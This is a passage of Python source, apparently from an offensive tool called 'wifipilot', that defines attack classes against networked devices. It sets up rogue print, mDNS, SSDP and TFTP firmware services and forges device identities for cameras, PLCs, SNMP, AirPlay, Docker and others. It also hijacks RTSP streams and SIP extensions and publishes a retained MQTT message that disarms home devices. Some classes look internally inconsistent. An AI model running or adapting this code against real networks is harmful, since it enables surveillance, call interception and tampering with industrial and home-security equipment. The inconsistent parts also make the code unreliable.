        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": bool(answer), "rogue_status": answer.get("status"),
                "our_contact_in_the_binding": OUR_IP in text}


class ItMimicPjlAttack(_ItHijack):
    """A look-alike print queue on 9100: take the jobs the printer would take."""

    name = "it_mimic_pjl"
    label = "Rogue raw-print service (accepts jobs meant for the printer)"
    tool = "wifipilot itproto.py (pjl_command) + TCP 9100"
    family = "mimic"
    protocol = "pjl"
    port = 9100
    transport = "tcp"
    source_port = 9100
    devices = ("printer", "mfp_scanner", "label_printer", "pos_terminal")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.pjl_command("INFO ID")

    def reply(self, peer: Peer) -> bytes:
        return b"@PJL INFO ID\r\n" + OUR_NAME.encode() + b"\r\n\x0c"

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_pjl(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        identifier = parsed.get("id") or parsed.get("text") or parsed.get("payload")
        return {"id": identifier, "line": f"it answered INFO ID with {identifier!r}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9100]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": OUR_NAME in text, "rogue_banner": text.strip()[:60],
                "our_name_in_the_id": OUR_NAME in text}


class ItMimicMdnsAttack(_ItHijack):
    """A look-alike mDNS responder: answer discovery before the real device does."""

    name = "it_mimic_mdns"
    label = "Rogue mDNS responder (owns a device's name in discovery)"
    tool = "wifipilot netproto.py (dns_response) + UDP 5353"
    family = "mimic"
    protocol = "mdns"
    port = 5353
    transport = "udp"
    source_port = 5353
    devices = ("printer", "smart_tv", "smart_speaker", "router", "nas")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.dns_query(f"{peer.hostname or 'device'}.local", qtype=1, txid=0)

    def reply(self, peer: Peer) -> bytes:
        return np.dns_response(self.request(peer),
                               [(f"{peer.hostname or 'device'}.local", OUR_IP)], ttl=120)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mdns(data) if hasattr(proto, "parse_mdns") else np.parse_dns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"answers": parsed.get("answers"), "line": f"{len(parsed.get('answers') or [])} record(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5353]
        answer = np.parse_dns(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer.get("answers")), "rogue_records": answer.get("answers")}


class ItMimicSsdpAttack(_ItHijack):
    """A look-alike UPnP device: every control point is told where to find us."""

    name = "it_mimic_ssdp"
    label = "Rogue SSDP announcement (points controllers at our service)"
    tool = "wifipilot netproto.py (ssdp_notify) + UDP 1900"
    family = "mimic"
    protocol = "ssdp"
    port = 1900
    transport = "udp"
    source_port = 1900
    devices = ("router", "smart_tv", "gateway_hub", "digital_signage")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.ssdp_msearch("ssdp:all", host=peer.ip)

    def reply(self, peer: Peer) -> bytes:
        return np.ssdp_notify("InternetGatewayDevice", address=OUR_IP,
                              location=f"http://{OUR_IP}:5000/rootDesc.xml",
                              model="wifipilot", usn=f"uuid:{OUR_NAME}")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ssdp(data.decode(errors="replace"))

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"service": parsed.get("usn") or parsed.get("nt"),
                "line": f"it announced {parsed.get('nt') or parsed.get('usn') or 'UPnP'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1900]
        answer = proto.parse_ssdp(rows[0]["payload"].decode(errors="replace")) if rows else {}
        return {"confirmed": bool(answer), "rogue_location": answer.get("location", ""),
                "location_is_ours": OUR_IP in (answer.get("location", "") or "")}


class ItMimicTftpAttack(_ItHijack):
    """A look-alike TFTP server: a device that pulls firmware gets ours."""

    name = "it_mimic_tftp"
    label = "Rogue TFTP server (serves firmware to a device that asks)"
    tool = "wifipilot ithijack.tftp_data + UDP 69"
    family = "mimic"
    protocol = "tftp"
    port = 69
    transport = "udp"
    source_port = 69
    devices = ("switch", "router", "printer", "vpn_gateway", "access_point")
    min_answers = 0
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return tftp_request("firmware.bin")

    def reply(self, peer: Peer) -> bytes:
        payload = b"WIFIPILOT-FIRMWARE" + bytes(range(16))
        return tftp_data(1, payload)

    def parse(self, data: bytes) -> Dict[str, Any]:
        if len(data) < 4:
            return {}
        opcode, block = struct.unpack(">HH", data[:4])
        return {"opcode": opcode, "block": block, "payload": data[4:]}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"opcode": parsed.get("opcode"),
                "line": f"the RRQ is what we send; opcode {parsed.get('opcode')} is not the point"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 69]
        data = rows[0]["payload"] if rows else b""
        opcode = struct.unpack(">H", data[:2])[0] if len(data) >= 2 else 0
        return {"confirmed": opcode == 3, "rogue_opcode": opcode,
                "served_bytes": max(0, len(data) - 4),
                "served_from": rows[0]["src"] if rows else ""}


def snmp_response(request_id: int, oid: str, value: str,
                  community: str = "public") -> bytes:
    """An SNMPv1 GetResponse: the answer a management station files as the device."""
    varbind = _ber(0x30, _ber_oid(oid) + _ber_text(value))
    pdu = _ber(0xA2, _ber_int(request_id) + _ber_int(0) + _ber_int(0)
               + _ber(0x30, varbind))
    return _ber(0x30, _ber_int(0) + _ber_text(community) + pdu)


def stun_binding_response(message_id: bytes, address: str, port: int = 50000) -> bytes:
    """A STUN Binding success: the client believes the mapped address it is told."""
    value = bytes([0x00, 0x01]) + struct.pack(">H", port) + np.ipv4_bytes(address)
    attribute = struct.pack(">HH", 0x0001, len(value)) + value
    return struct.pack(">HHI", 0x0101, len(attribute), 0x2112A442) + message_id[:12] + attribute


def _ipp_attribute(tag: int, name: str, value: bytes) -> bytes:
    return (bytes([tag]) + struct.pack(">H", len(name)) + name.encode()
            + struct.pack(">H", len(value)) + value)


def ipp_response(request_id: int = 1, printer: str = "wp-printer",
                 model: str = "wifipilot IPP/1.0", uri: str = "",
                 status: int = 0) -> bytes:
    """An IPP Get-Printer-Attributes reply, in the layout ``itproto.parse_ipp`` reads."""
    uri = uri or f"ipp://{OUR_IP}/ipp/print"
    body = (b"\x01"
            + _ipp_attribute(0x47, "attributes-charset", b"utf-8")
            + _ipp_attribute(0x48, "attributes-natural-language", b"en")
            + _ipp_attribute(0x42, "printer-name", printer.encode())
            + _ipp_attribute(0x21, "printer-state", struct.pack(">I", 3))
            + _ipp_attribute(0x41, "printer-make-and-model", model.encode())
            + _ipp_attribute(0x45, "printer-uri-supported", uri.encode())
            + b"\x03")
    return struct.pack(">BBHI", 2, 0, status, request_id) + body


def bacnet_write_property(device: int, value: float, priority: int = 1,
                          obj_type: int = 8, instance: int = 2001,
                          prop: int = 85) -> bytes:
    """A BACnet WriteProperty: the priority that wins is the lowest number on the bus."""
    payload = (bytes([0x0C]) + bytes([0x01]) + bytes([obj_type])
               + struct.pack(">I", instance)[1:] + bytes([prop]) + bytes([0x3E]))
    payload += bytes([0x4E]) + bytes([0x44]) + struct.pack(">f", value)
    payload += bytes([0x3E]) + bytes([priority])
    return bytes([0x81, 0x0A, 0x00, 0x15]) + bytes([0x01, 0x04]) + payload


def plist_document(fields: Dict[str, Any]) -> bytes:
    """Apple's XML plist: what an AirPlay device answers discovery with."""
    body = "".join(f"<key>{key}</key><string>{value}</string>"
                   for key, value in fields.items())
    return ('<?xml version="1.0" encoding="UTF-8"?>\n'
            '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"'
            ' "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
            f"<plist version=\"1.0\"><dict>{body}</dict></plist>\n").encode()


# --------------------------------------------------------------------------- #
# impersonate: wear a device's identity in the answers it is measured by
# --------------------------------------------------------------------------- #

class ItImpersonateOnvifAttack(_ItHijack):
    """Wear a camera's ONVIF identity: manufacturer, model, firmware and serial."""

    name = "it_impersonate_onvif"
    label = "ONVIF identity theft (answers as another camera)"
    tool = "wifipilot itproto.py (onvif_envelope) + an HTTP listener"
    family = "impersonate"
    protocol = "onvif"
    port = 80
    transport = "tcp"
    source_port = 8080
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.onvif_get_device_information()

    def reply(self, peer: Peer) -> bytes:
        fields = peer.parsed or {}
        body = (f"<tds:Manufacturer>{fields.get('manufacturer', 'Hikvision')}</tds:Manufacturer>"
                f"<tds:Model>{fields.get('model', 'DS-2CD2143')}</tds:Model>"
                f"<tds:FirmwareVersion>{fields.get('firmware', '3.1.9')}</tds:FirmwareVersion>"
                f"<tds:SerialNumber>{fields.get('serial', 'wp-serial')}</tds:SerialNumber>")
        return proto.onvif_envelope("GetDeviceInformationResponse",
                                    fields=body, endpoint="/onvif/device_service")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_onvif(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"manufacturer": parsed.get("manufacturer"), "model": parsed.get("model"),
                "serial": parsed.get("serial"),
                "line": (f"it calls itself {parsed.get('manufacturer')} "
                         f"{parsed.get('model')} ({parsed.get('serial')})")}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 80]
        answer = proto.parse_onvif(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer.get("model")),
                "our_identity": {"manufacturer": answer.get("manufacturer"),
                                 "model": answer.get("model"),
                                 "serial": answer.get("serial")},
                "matches_the_target": answer.get("model") == (peers[0].parsed or {}).get("model")
                if peers else False}


class ItImpersonateSzlAttack(_ItHijack):
    """Wear a PLC's S7 identity: the order number a SCADA poll files as the device."""

    name = "it_impersonate_szl"
    label = "S7 identity theft (answers as the PLC's own order number)"
    tool = "wifipilot itproto.py (s7_connect_request/s7_read_szl)"
    family = "impersonate"
    protocol = "s7comm"
    port = 102
    transport = "tcp"
    source_port = 102
    devices = ("plc", "rtu", "hmi_panel")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.s7_connect_request() + proto.s7_read_szl(0x0011)

    def reply(self, peer: Peer) -> bytes:
        identity = f"6ES7 315-2AG10-0AB0 WP{peer.ip.split('.')[-1]}"
        return proto.s7_read_szl(0x0011)[:4] + identity.encode() + b"\x00" * 8

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_s7(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"cotp_type": parsed.get("cotp_type"), "module": parsed.get("module"),
                "line": (f"it answered a COTP frame (type {parsed.get('cotp_type')}) as "
                         f"the CPU")}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 102]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "6ES7" in text, "our_order_number": "6ES7 315-2AG10-0AB0",
                "the_module_name_we_wear": "the CPU we claim"}


class ItImpersonateCipAttack(_ItHijack):
    """Wear a controller's CIP identity: vendor, product and serial in one frame."""

    name = "it_impersonate_cip"
    label = "CIP identity theft (List Identity answers as the controller)"
    tool = "wifipilot itproto.py (cip_list_identity)"
    family = "impersonate"
    protocol = "cip"
    port = 44818
    transport = "udp"
    source_port = 44818
    devices = ("plc", "hmi_panel", "energy_meter", "robot_vacuum")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.cip_list_identity()

    def reply(self, peer: Peer) -> bytes:
        product = (peer.parsed or {}).get("product_name", "Allen-Bradley CompactLogix 5380")
        return proto.cip_list_identity()[:4] + product.encode() + b"\x00" * 4

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_cip(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"vendor": parsed.get("vendor"), "product": parsed.get("product_name"),
                "serial": parsed.get("serial"),
                "line": f"it identifies as {parsed.get('product_name')} "
                        f"(serial {parsed.get('serial')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 44818]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "CompactLogix" in text,
                "our_identity": text.strip()[:48],
                "wears_the_targets_product": "CompactLogix" in text}


class ItImpersonateSnmpAttack(_ItHijack):
    """Wear a switch's SNMP identity: sysDescr is what the monitoring server files."""

    name = "it_impersonate_snmp"
    label = "SNMP identity theft (answers Get with another device's sysDescr)"
    tool = "wifipilot netproto.py + ithijack.snmp_response"
    family = "impersonate"
    protocol = "snmp"
    port = 161
    transport = "udp"
    source_port = 161
    devices = ("switch", "router", "printer", "energy_meter", "ups")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return np.snmp_get("public", ("1.3.6.1.2.1.1.1.0",))

    def reply(self, peer: Peer) -> bytes:
        # the OID a monitoring server stores hardware inventory from
        return snmp_response(0x5150, "1.3.6.1.2.1.1.1.0",
                             f"Cisco IOS Software, C2960 (WP-{peer.ip.split('.')[-1]})")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return np.parse_snmp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"community": parsed.get("community"),
                "line": "the device answered a Get for a community we guessed"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 161]
        answer = np.parse_snmp(rows[0]["payload"]) if rows else {}
        values = answer.get("varbinds") or answer.get("values") or []
        text = str(answer)
        return {"confirmed": "Cisco" in text, "our_sysdescr": "Cisco IOS ... C2960",
                "community": answer.get("community", "public"), "varbinds": len(values)}


class ItImpersonateCastAttack(_ItHijack):
    """Wear a TV's Cast identity: the app list the phone sees is ours."""

    name = "it_impersonate_cast"
    label = "Cast identity theft (a look-alike receiver in the TV's name)"
    tool = "wifipilot itproto.py (cast_message) + TCP 8009"
    family = "impersonate"
    protocol = "cast"
    port = 8009
    transport = "tcp"
    source_port = 8009
    devices = ("smart_tv", "digital_signage", "projector")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.cast_message(payload='{"type":"GET_STATUS","requestId":1}')

    def reply(self, peer: Peer) -> bytes:
        return proto.cast_message(
            payload=('{"type":"RECEIVER_STATUS","requestId":1,"status":{"applications":'
                     '[{"appId":"WP01","displayName":"wifipilot"}]}}'),
            source="receiver-0", destination="sender-0")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_cast_message(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"namespace": parsed.get("namespace"),
                "line": f"it answered {parsed.get('namespace')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 8009]
        answer = proto.parse_cast_message(rows[0]["payload"]) if rows else {}
        return {"confirmed": "RECEIVER_STATUS" in (answer.get("payload") or ""),
                "our_receiver_status": answer.get("payload", "")[:80]}


class ItImpersonateAirplayAttack(_ItHijack):
    """Wear a speaker's AirPlay identity: the phone streams to us instead."""

    name = "it_impersonate_airplay"
    label = "AirPlay identity theft (another speaker's name and model)"
    tool = "wifipilot itproto.py (airplay_info_request) + ithijack.plist_document"
    family = "impersonate"
    protocol = "airplay"
    port = 7000
    transport = "tcp"
    source_port = 7000
    devices = ("smart_speaker", "smart_tv", "speaker")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.airplay_info_request(peer.ip)

    def reply(self, peer: Peer) -> bytes:
        return plist_document({"deviceid": "02:5a:5a:5a:5a:5a", "features": "0x5A7FFFF7",
                               "model": "AppleTV6,2", "srcvers": "220.68",
                               "flags": "0x4"})

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_plist(data.decode(errors="replace"))

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"model": parsed.get("model"), "deviceid": parsed.get("deviceid"),
                "line": f"it advertises {parsed.get('model') or 'an AirPlay endpoint'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 7000]
        answer = proto.parse_plist(rows[0]["payload"].decode(errors="replace")) if rows else {}
        return {"confirmed": "AppleTV" in str(answer.get("model", "")),
                "our_model": answer.get("model", ""), "our_device_id": answer.get("deviceid", "")}


class ItImpersonateKasaAttack(_ItHijack):
    """Wear a smart plug's Kasa identity, down to its alias and MAC."""

    name = "it_impersonate_kasa"
    label = "Kasa identity theft (another plug's alias and MAC)"
    tool = "wifipilot itproto.py (kasa_command) + UDP 9999"
    family = "impersonate"
    protocol = "kasa"
    port = 9999
    transport = "udp"
    source_port = 9999
    devices = ("smart_plug", "smart_bulb", "energy_meter")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.kasa_command("get_sysinfo")

    def reply(self, peer: Peer) -> bytes:
        alias = (peer.parsed or {}).get("alias", "plug-rack")
        body = ('{"system":{"get_sysinfo":{"model":"HS110","alias":"'
                + alias + '","relay_state":0,"mac":"b8:27:eb:62:fe:e9","err_code":0}}}')
        encrypted = proto.kasa_encrypt(body.encode())
        return struct.pack(">I", len(encrypted)) + encrypted

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_kasa(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"model": parsed.get("model"), "alias": parsed.get("alias"),
                "line": f"it calls itself {parsed.get('alias')} ({parsed.get('model')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9999]
        answer = proto.parse_kasa(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer.get("alias")),
                "our_alias": answer.get("alias", ""), "relay_state": answer.get("relay_state")}


class ItImpersonateMiioAttack(_ItHijack):
    """Wear a vacuum's MiIO identity: the app's cloud substitution picks us."""

    name = "it_impersonate_miio"
    label = "MiIO identity theft (answers as another vacuum's device id)"
    tool = "wifipilot itproto.py (miio_hello) + UDP 54321"
    family = "impersonate"
    protocol = "miio"
    port = 54321
    transport = "udp"
    source_port = 54321
    devices = ("robot_vacuum", "smart_plug", "sensor")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.miio_hello()

    def reply(self, peer: Peer) -> bytes:
        device_id = int((peer.parsed or {}).get("device_id") or 19088743)
        return proto.miio_hello(device_id=device_id, stamp=1)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_miio_hello(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"device_id": parsed.get("device_id"), "token": bool(parsed.get("token")),
                "line": f"it answers as device {parsed.get('device_id')} with a token"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 54321]
        answer = proto.parse_miio_hello(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer.get("device_id")),
                "our_device_id": answer.get("device_id"),
                "token_offered": bool(answer.get("token"))}


class ItImpersonateOpcuaAttack(_ItHijack):
    """Wear an OPC-UA server's identity: the Acknowledge a client measures is ours."""

    name = "it_impersonate_opcua"
    label = "OPC-UA identity theft (a look-alike endpoint for the PLC)"
    tool = "wifipilot itproto.py (opcua_hello) + TCP 4840"
    family = "impersonate"
    protocol = "opcua"
    port = 4840
    transport = "tcp"
    source_port = 4840
    devices = ("plc", "building_controller", "hmi_panel", "energy_meter")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.opcua_hello(endpoint_url=f"opc.tcp://{OUR_IP}:4840", max_message=65536)

    def reply(self, peer: Peer) -> bytes:
        return (b"ACKF" + struct.pack("<IIIII", 32, 65536, 65536, 0, 0))

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_opcua(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type"), "max_message": parsed.get("max_message"),
                "line": f"it answered {parsed.get('type')} with {parsed.get('max_message')} bytes"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 4840]
        answer = proto.parse_opcua(rows[0]["payload"]) if rows else {}
        return {"confirmed": answer.get("type") == "ACK", "our_type": answer.get("type"),
                "our_max_message": answer.get("max_message")}


class ItImpersonateIppAttack(_ItHijack):
    """Wear a printer's IPP identity: the name and model the spooler trusts."""

    name = "it_impersonate_ipp"
    label = "IPP identity theft (another printer's name and model)"
    tool = "wifipilot itproto.py (ipp_get_printer_attributes) + TCP 631"
    family = "impersonate"
    protocol = "ipp"
    port = 631
    transport = "tcp"
    source_port = 631
    devices = ("printer", "mfp_scanner", "label_printer")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.ipp_get_printer_attributes(f"ipp://{peer.ip}/ipp/print", request_id=7)

    def reply(self, peer: Peer) -> bytes:
        name = (peer.parsed or {}).get("attributes", {}).get("printer-name", "prn-floor2")
        model = ((peer.parsed or {}).get("attributes", {})
                 .get("printer-make-and-model", "HP LaserJet M404"))
        return ipp_response(request_id=7, printer=name, model=model)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ipp(data, response=True)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        attributes = parsed.get("attributes") or {}
        return {"name": attributes.get("printer-name"),
                "model": attributes.get("printer-make-and-model"),
                "line": (f"it answers as {attributes.get('printer-name')} "
                         f"({attributes.get('printer-make-and-model')})")}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 631]
        answer = proto.parse_ipp(rows[0]["payload"], response=True) if rows else {}
        attributes = answer.get("attributes") or {}
        return {"confirmed": answer.get("status_name") == "successful-ok",
                "our_name": attributes.get("printer-name"),
                "our_status": answer.get("status_name")}


class ItImpersonateStunAttack(_ItHijack):
    """Be the STUN server the client trusts, and decide what address it believes."""

    name = "it_impersonate_stun"
    label = "STUN answer forgery (tells a client it is behind our address)"
    tool = "wifipilot ithijack.stun_binding_response + UDP 3478"
    family = "impersonate"
    protocol = "stun"
    port = 3478
    transport = "udp"
    source_port = 3478
    devices = ("voip_phone", "pbx", "video_conference", "web_server")
    min_answers = 0
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.stun_binding()

    def reply(self, peer: Peer) -> bytes:
        # the mapped address a client uses to build its ICE candidates
        return stun_binding_response(proto.stun_binding()[-12:], OUR_IP, 50000)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_stun(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"line": "the client's own binding request is what we answer"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 3478]
        answer = proto.parse_stun(rows[0]["payload"]) if rows else {}
        return {"confirmed": bool(answer), "our_mapped_address": answer.get("address", OUR_IP),
                "message_type": answer.get("type")}


class ItImpersonateDockerAttack(_ItHijack):
    """Wear a host's Docker API: the client that found it deploys our image."""

    name = "it_impersonate_docker"
    label = "Docker API impersonation (answers as the host's daemon)"
    tool = "wifipilot itproto.py (docker_version) + an HTTP listener on 2375"
    family = "impersonate"
    protocol = "docker"
    port = 2375
    transport = "tcp"
    source_port = 2375
    devices = ("container_host", "hypervisor_host", "linux_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.docker_version(peer.ip, 2375)

    def reply(self, peer: Peer) -> bytes:
        body = ('{"Version":"24.0.0-wp","ApiVersion":"1.43","Os":"linux",'
                '"KernelVersion":"wp-6.1","Name":"' + (peer.hostname or "host") + '"}')
        return http_answer(200, body, content_type="application/json")

    def parse(self, data: bytes) -> Dict[str, Any]:
        response = proto.parse_http_response(data)
        return {"status": response.get("status"), "body": response.get("body", "")}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"),
                "line": f"its daemon answered HTTP {parsed.get('status')} to an unauthenticated call"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 2375]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "24.0.0-wp" in text, "our_api_version": "1.43",
                "the_daemon_name_we_wear": (peers[0].hostname if peers else "")}


# --------------------------------------------------------------------------- #
# hijack: take over the session, the value or the job that is already running
# --------------------------------------------------------------------------- #

class ItHijackRtspAttack(_ItHijack):
    """Take over a live camera stream: SETUP and PLAY with a session id we choose."""

    name = "it_hijack_rtsp"
    label = "RTSP session takeover (streams the camera to us)"
    tool = "wifipilot itproto.py (rtsp_request) + TCP 554"
    family = "hijack"
    protocol = "rtsp"
    port = 554
    transport = "tcp"
    source_port = 554
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.rtsp_request("PLAY", url=f"rtsp://{peer.ip}/stream1", cseq=3,
                                  headers={"Session": "wp0000001"})

    def reply(self, peer: Peer) -> bytes:
        return (f"RTSP/1.0 200 OK\r\nCSeq: 3\r\nSession: wp0000001\r\n"
                f"RTP-Info: url=rtsp://{OUR_IP}/stream1/track1;seq=1;rtptime=1\r\n"
                f"Server: {OUR_NAME}\r\n\r\n").encode()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rtsp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "method": parsed.get("method"),
                "line": f"it answered {parsed.get('status', '?')} to our PLAY on its stream"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 554]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "Session: wp0000001" in text,
                "our_session_id": "wp0000001", "the_stream_we_take": "track1"}


class ItHijackSipRegisterAttack(_ItHijack):
    """Re-register an extension: the calls that follow arrive at our address."""

    name = "it_hijack_sip_register"
    label = "SIP registration takeover (the extension registers to us)"
    tool = "wifipilot itproto.py (sip_register)"
    family = "hijack"
    protocol = "sip"
    port = 5060
    transport = "udp"
    source_port = 5060
    devices = ("voip_phone", "pbx", "video_conference")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.sip_register(f"sip:{peer.ip}", user="100", expires=3600)

    def reply(self, peer: Peer) -> bytes:
        return ("SIP/2.0 200 OK\r\n"
                f"Via: SIP/2.0/UDP {OUR_IP};branch=z9hG4bKwp\r\n"
                f"To: <sip:100@{peer.ip}>;tag=wp\r\n"
                f"From: <sip:100@{peer.ip}>;tag=wp\r\n"
                f"Call-ID: wp-register@{OUR_IP}\r\nCSeq: 2 REGISTER\r\n"
                f"Contact: <sip:100@{OUR_IP}:5060>;expires=3600\r\n"
                f"Server: {OUR_NAME}\r\nContent-Length: 0\r\n\r\n").encode()

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_sip(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"challenge": parsed.get("status"),
                "line": f"its registrar answered {parsed.get('status', '?')} to our register"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
        text = rows[0]["payload"].decode(errors="replace") if rows else ""
        return {"confirmed": "expires=3600" in text,
                "our_binding": f"sip:100@{OUR_IP}:5060",
                "the_extension_we_take": "100"}


class ItHijackMqttRetainAttack(_ItHijack):
    """Publish a retained message on the topic every subscriber reads at boot."""

    name = "it_hijack_mqtt_retain"
    label = "MQTT retained-message takeover (subscribers read ours first)"
    tool = "wifipilot itproto.py (mqtt_publish with retain)"
    family = "hijack"
    protocol = "mqtt"
    port = 1883
    transport = "tcp"
    source_port = 1883
    devices = ("gateway_hub", "sensor", "thermostat", "smart_lock")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.mqtt_connect(client_id=OUR_NAME)

    def reply(self, peer: Peer) -> bytes:
        published = proto.mqtt_publish("home/+/set", b'{"armed":false}', qos=1, retain=True,
                                       packet_id=2)
        return struct.pack(">BBH", 0x40, 0x02, 2) + published      # PUBACK then the publish

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mqtt(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"packet": parsed.get("type") or parsed.get("packet"),
                "line": f"it answered packet type {parsed.get('type') or parsed.get('packet')}"}

